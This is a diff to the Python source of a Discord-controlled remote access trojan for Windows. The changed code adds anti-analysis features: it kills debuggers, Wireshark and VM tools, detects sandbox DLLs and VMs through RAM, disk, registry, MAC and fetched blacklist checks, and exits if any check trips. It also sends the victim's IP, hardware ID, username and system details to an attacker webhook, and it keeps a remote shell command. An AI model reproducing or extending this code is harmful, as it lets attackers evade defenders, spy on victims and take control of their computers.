@@ -7,12 +7,13 @@ import os
 import subprocess as sp
 import requests 
 import cv2
-from queue import Queue
-import socket
-import time  
 import win32clipboard
 import win32gui
 import win32com.client as wincl
+import win32api
+import win32process
+import socket
+import time  
 import re
 import sys
 import shutil
@@ -28,14 +29,14 @@ import comtypes
 import threading
 import requests.exceptions
 
-import uuid
-import platform, wmi, psutil
+import platform, wmi, psutil, httpx, uuid
+from queue import Queue
 from datetime import datetime
 import sounddevice as sd
 from scipy.io.wavfile import write
+from ctypes import *
 
 
-from urllib.request import Request, urlopen
 from time import sleep
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
@@ -57,73 +58,183 @@ webhook = 'DISCORD_WEBHOOK_URL'
 server_id = "DISCORD_SERVER_ID"
 g = [int(server_id)]
 
+os.system("cls")
 
 
-'''
-Anti Debug
-'''
+#region Anti-Debug
+
+#region Config
+
+api = "URL_HERE"
+
+sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
+program_blacklist = [
+    "httpdebuggerui.exe", 
+    "wireshark.exe", 
+    "HTTPDebuggerSvc.exe", 
+    "fiddler.exe", 
+    "regedit.exe", 
+    "vboxservice.exe", 
+    "df5serv.exe", 
+    "processhacker.exe", 
+    "vboxtray.exe", 
+    "vmtoolsd.exe", 
+    "vmwaretray.exe", 
+    "ida64.exe", 
+    "ollydbg.exe",
+    "pestudio.exe", 
+    "vmwareuser", 
+    "vgauthservice.exe", 
+    "vmacthlp.exe", 
+    "x96dbg.exe", 
+    "vmsrvc.exe", 
+    "x32dbg.exe", 
+    "vmusrvc.exe", 
+    "prl_cc.exe", 
+    "prl_tools.exe", 
+    "xenservice.exe", 
+    "qemu-ga.exe", 
+    "joeboxcontrol.exe", 
+    "ksdumperclient.exe", 
+    "ksdumper.exe",
+    "joeboxserver.exe"
+]
+
 vmcheck_switch = True
 vtdetect_switch = True
 listcheck_switch = True
 anti_debug_switch = True
+#endregion
 
+def post_message(msg):
+    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})
 
-#region Anti Debug
-def block_debugger():
-    for proc in psutil.process_iter():
-        try:
-            processName = proc.name()
-            if processName == "HTTPDebuggerUI.exe": os._exit(1)
-            if processName == "HTTPDebuggerSvc.exe": os._exit(1)
-            if processName == "Taskmgr.exe": os._exit(1)
-            if processName == "ProcessHacker.exe": os._exit(1)
-            if processName == "Wireshark.exe": os._exit(1)
-            if processName == "OLLYDBG.EXE": os._exit(1)
-            if processName == "x64dbg.exe": os._exit(1)   
-            if processName == "x32dbg.exe": os._exit(1)     
-            if processName == "x96dbg.exe": os._exit(1)
-            if processName == "ida64.exe": os._exit(1)   
-            if processName == "KsDumperClient.exe": os._exit(1) 
-            if processName == "KsDumper.exe": os._exit(1) 
-            if processName == "pestudio.exe": os._exit(1)
-            if processName == "Fiddler.exe": os._exit(1)
-        except: pass
+def anti_debug():
+    while True:
+        time.sleep(0.7)
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in program_blacklist):
+                try:
+                    proc.kill()
+                except(psutil.NoSuchProcess, psutil.AccessDenied): pass
 
 def block_dlls():
-    time.sleep(0.7)
-    try:
-        sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
-        requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
+    while True:
+        time.sleep(1)
+        EvidenceOfSandbox = []
+        allPids = win32process.EnumProcesses()
+        for pid in allPids:
+            try:
+                hProcess = win32api.OpenProcess(0x0410, 0, pid)
+                try:
+                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
+                    for dll in curProcessDLLs:
+                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
+                        for sandboxDLL in sandboxDLLs:
+                            if sandboxDLL in dllName:
+                                if dllName not in EvidenceOfSandbox:
+                                    EvidenceOfSandbox.append(dllName)
+                finally:
+                        win32api.CloseHandle(hProcess)
+            except:
+                    pass
+        if EvidenceOfSandbox:
+            requests.post(f'{api}',json={'content': f"""```yaml
+The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
+Dlls: {EvidenceOfSandbox}
+```"""})
+            os._exit(1)
+        else: pass
+
+def ram_check():
+    class MEMORYSTATUSEX(ctypes.Structure):
+        _fields_ = [
+            ("dwLength", ctypes.c_ulong),
+            ("dwMemoryLoad", ctypes.c_ulong),
+            ("ullTotalPhys", ctypes.c_ulonglong),
+            ("ullAvailPhys", ctypes.c_ulonglong),
+            ("ullTotalPageFile", ctypes.c_ulonglong),
+            ("ullAvailPageFile", ctypes.c_ulonglong),
+            ("ullTotalVirtual", ctypes.c_ulonglong),
+            ("ullAvailVirtual", ctypes.c_ulonglong),
+            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
+        ]
+
+    memoryStatus = MEMORYSTATUSEX()
+    memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
+
+    if memoryStatus.ullTotalPhys/1073741824 > 1:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Ram Check: The RAM of this host is at least 4 GB in size. Proceed!
+```"""})
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
+```"""})
         os._exit(1)
-    except: pass  
+
+def is_debugger():
+    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
+
+    if (isDebuggerPresent):
+        requests.post(f'{api}',json={'content': f"""```yaml
+IsDebuggerPresent: A debugger is present, exiting program...
+```"""})        
+        os._exit(1)
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+IsDebuggerPresent: No debugger is present. Proceed!
+```"""})  
+        pass
+
+def disk_check():
+    minDiskSizeGB = 50
+    if len(sys.argv) > 1:
+        minDiskSizeGB = float(sys.argv[1])
+
+    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
+
+    diskSizeGB = diskSizeBytes/1073741824
+
+    if diskSizeGB > minDiskSizeGB:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Disk Check: The disk size of this host is {diskSizeGB} GB, which is greater than the minimum {minDiskSizeGB} GB. Proceed!
+```"""})
+    else:
+        requests.post(f'{api}',json={'content': f"""```yaml
+Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
+```"""})
+        os._exit(1)
 
 def getip():
     ip = "None"
-    try: ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    try: ip = requests.get("https://api.ipify.org").text
     except: pass
     return ip
 
-ip = getip()
 
+ip = getip()
 serveruser = os.getenv("UserName")
 pc_name = os.getenv("COMPUTERNAME")
 mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 computer = wmi.WMI()
 os_info = computer.Win32_OperatingSystem()[0]
 os_name = os_info.Name.encode('utf-8').split(b'|')[0]
+gpu = computer.Win32_VideoController()[0].Name
 currentplat = os_name
 hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-hwidlist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/hwid_list.txt')
-pcnamelist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/pc_name_list.txt')
-pcusernamelist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/pc_username_list.txt')
-iplist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/ip_list.txt')
-maclist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/mac_list.txt')
-gpulist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/gpu_list.txt')
-platformlist = requests.get('https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/blacklist/pc_platforms.txt')
-api = webhook
+hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
+pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
+pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
+iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
+maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
+gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
+platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
+
 
 def vtdetect():
-    data_from_check = (f"""```yaml
+    requests.post(api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
 ![PC DETECTED]!  
 PC Name: {pc_name}
 PC Username: {serveruser}
@@ -133,9 +244,8 @@ MAC: {mac}
 PLATFORM: {os_name}
 CPU: {computer.Win32_Processor()[0].Name}
 RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
-GPU: {computer.Win32_VideoController()[0].Name}
-TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")
-    return data_from_check
+GPU: {gpu}
+TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})
 
 def vmcheck():
     def get_base_prefix_compat(): # define all of the checks
@@ -144,19 +254,18 @@ def vmcheck():
     def in_virtualenv(): 
         return get_base_prefix_compat() != sys.prefix
 
-    if in_virtualenv() == True: # if we are in a vm
-        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
+    if in_virtualenv() == True: # If vm is detected
+        post_message("**VM DETECTED, EXITING PROGRAM...**")
         os._exit(1) # exit
     
-    else:
-        pass
+    else: pass
 
     def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
         reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
         reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
         
         if reg1 != 1 and reg2 != 1:    
-            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
+            post_message("VMware Registry Detected")
             os._exit(1)
 
     def processes_and_files_check():
@@ -166,124 +275,113 @@ def vmcheck():
         process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
         processList = []
         for processNames in process.split(" "):
-            if ".exe" in processNames:
-                processList.append(processNames.replace("K\n", "").replace("\n", ""))
+            if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
-            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
+            post_message("VMwareService.exe & VMwareTray.exe process are running")
             os._exit(1)
                         
         if os.path.exists(vmware_dll): 
-            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
+            post_message("**Vmware DLL Detected**")
             os._exit(1)
             
         if os.path.exists(virtualbox_dll):
-            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
-            os._exit(1)
-        
-        try:
-            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
-            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
-            os._exit(1)
-        except:
-            pass        
+            post_message("**VirtualBox DLL Detected**")
+            os._exit(1)   
 
     def mac_check():
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
         if mac_address[:8] in vmware_mac_list:
-            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
+            post_message("**VMware MAC Address Detected**")
             os._exit(1)
+
+
     registry_check()
     processes_and_files_check()
     mac_check()
+    post_message("[+] VM Not Detected") 
 
 def listcheck():
     try:
         if hwid in hwidlist.text:
-            requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
+            post_message(f"**Blacklisted HWID Detected. HWID:** `{hwid}`")
+            time.sleep(2)
             os._exit(1)
-        else:
-            pass
-    except:
-        os._exit(1)
+        else: pass
+    except: os._exit(1)
 
     try:
         if serveruser in pcusernamelist.text:
-            requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
-            os._exit(1)
-        else:
-            pass
-    except:
-        os._exit(1)
-
-    try:
-        if pc_name in pcnamelist.text:
-            requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
+            post_message(f"**Blacklisted PC User:** `{serveruser}`")
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
-    except:
-        time.sleep(2) 
-        os._exit(1)
+        else: pass
+    except: os._exit(1)
+
+    try:
+        if pc_name in pcnamelist.text: 
+            post_message(f"**Blacklisted PC Name:** `{pc_name}`")
+            time.sleep(2)
+            os._exit(1)
+        else: pass
+    except: os._exit(1)
 
     try:
         if ip in iplist.text:
-            requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
+            post_message(f"**Blacklisted IP:** `{ip}`")
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
-    except:
-        time.sleep(2) 
-        os._exit(1)
+        else: pass
+    except: os._exit(1)
 
     try:
         if mac in maclist.text:
-            requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
+            post_message(f"**Blacklisted MAC:** `{mac}`")
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
-    except:
-        time.sleep(2) 
-        os._exit(1)
-
-    gpu = computer.Win32_VideoController()[0].Name
+        else: pass
+    except: os._exit(1)
 
     try:
         if gpu in gpulist.text:        
-            requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
+            post_message(f"**Blacklisted GPU:** `{gpu}`")
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
-    except:
-        time.sleep(2) 
-        os._exit(1)
+        else: pass
+    except: os._exit(1)
 
-if anti_debug_switch == True:
-    try:
-        threading.Thread(name='Anti-Debug', target=block_debugger).start()
-        threading.Thread(name='Anti-DLL', target=block_dlls).start()
-    except: pass
-else: pass
+def main():
+    is_debugger()
+    disk_check()
+    ram_check()
+    if anti_debug_switch == True:
+        try:
+            threading.Thread(name='Anti-Debug', target=anti_debug).start()
+            threading.Thread(name='Anti-DLL', target=block_dlls).start()
+        except: pass
+    else: pass
 
-try:
-    if vtdetect_switch == True: vtdetect()
+    if vtdetect_switch == True: vtdetect()      # VTDETECT
     else: pass
-    if vmcheck_switch == True: vmcheck()
+
+    if vmcheck_switch == True: vmcheck()        # VMCHECK
     else: pass
-    if listcheck_switch == True: listcheck()
+
+    if listcheck_switch == True: listcheck()    # LISTCHECK
     else: pass
-except Exception as e:
-    requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})
-    os._exit(1)
+
+if platform.system() == 'Windows':
+    try: httpx.get('https://google.com')
+    except (httpx.NetworkError, httpx.TimeoutException): os._exit(1)
+    main()
+else: os._exit(1)
+
 #endregion
 
 
-#region Main RAT
+
+#region RAT
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Remote Access Tool', help_command=None)
 slash = SlashCommand(client, sync_commands=True)
 
@@ -292,18 +390,15 @@ slash = SlashCommand(client, sync_commands=True)
 async def on_slash_command_error(ctx, error):
     if isinstance(error, discord.ext.commands.errors.MissingPermissions):
         await ctx.send('Discord BOT missing correct permissions, please make sure to give the BOT admin perms')
-    else:
-        requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})
+    else: pass
 
 @client.event
 async def on_command_error(cmd, error):
-    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
-        pass
+    if isinstance(error, discord.ext.commands.errors.CommandNotFound): pass
 
 async def activity(client):
     while True:
-        if stop_threads:
-            break
+        if stop_threads: break
         window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
         await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
         sleep(1)
@@ -313,10 +408,7 @@ async def on_ready():
     global channel_name
     DiscordComponents(client)
     number = 0
-    with urlopen("http://ipinfo.io/json") as url:
-        data = json.loads(url.read().decode())
-        ip = data['ip']
-        
+
     for x in client.get_all_channels():
         (on_ready.total).append(x.name)
     for y in range(len(on_ready.total)):
@@ -324,8 +416,7 @@ async def on_ready():
             result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
             biggest = max(map(int, result))
             number = biggest + 1
-        else:
-            pass  
+        else: pass  
 
     if number == 0:
         channel_name = "session-1"
@@ -339,10 +430,8 @@ async def on_ready():
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     global data_from_check
     value1 = f"> Gained access to **`{os.getlogin()}`** system!"
-    if is_admin == True:
-        my_embed = discord.Embed(title=f'{value1} with **`admin`** perms', description=f"{vtdetect()}", color=0x3A3636)
-    elif is_admin == False:
-        my_embed = discord.Embed(title=value1, description=f"{vtdetect()}", color=0x3A3636)
+    if is_admin == True: my_embed = discord.Embed(title=f'{value1} with **`admin`** perms', description=f"{vtdetect()}", color=0x3A3636)
+    elif is_admin == False: my_embed = discord.Embed(title=value1, description=f"{vtdetect()}", color=0x3A3636)
     await channel.send(embed=my_embed)
     game = discord.Game(f"RAT | cookiesservices.xyz")
     await client.change_presence(status=discord.Status.online, activity=game)
@@ -1078,8 +1167,6 @@ async def Shell_command(ctx: SlashContext, command: str):
                 status = "ok"
                 return output.stdout.decode('CP437').strip()
             out = shell(instruction)
-            print(out)
-            print(status)
             if status:
                 numb = len(out)
                 if numb < 1:
@@ -1722,6 +1809,8 @@ async def listProccess_command(ctx: SlashContext):
 #endregion
 
 #endregion
+
+
 
 def token_set(str):
     token = str
